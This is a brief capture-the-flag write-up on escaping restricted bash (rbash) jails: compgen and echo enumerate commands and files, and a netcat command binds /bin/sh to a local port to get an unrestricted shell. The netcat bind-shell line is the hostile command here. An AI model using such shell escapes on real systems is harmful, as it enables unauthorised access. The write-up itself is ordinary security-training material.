# jail

## rbash warmup
> Solved By : thewhiteh4t

we can use `compgen` to check for available commands

```
compgen -c
```

![](https://i.imgur.com/bLD71b6.png)


another way is to use `echo`


![](https://i.imgur.com/chEZt6C.png)


now the known way of escaping with `nc` is by getting a shell on our “attacker” box but in this challenge we are not allowed to connect to remote machines so we are left with localhost

actually this is more easy…

```
nc -lvp 4444 -e /bin/sh &
```

![](https://i.imgur.com/DmtwlOo.png)


now we can connect to it !


![](https://i.imgur.com/JiBB1By.png)

----------


## rbash yet another calculator
> Solved By : thewhiteh4t

challenge mentions that filename has been changed this time but it is in the same working directory

so we can again use echo to check the file name

![](https://i.imgur.com/cViiit2.png)


just google “echo read file”


![](https://i.imgur.com/PybHNWT.png)
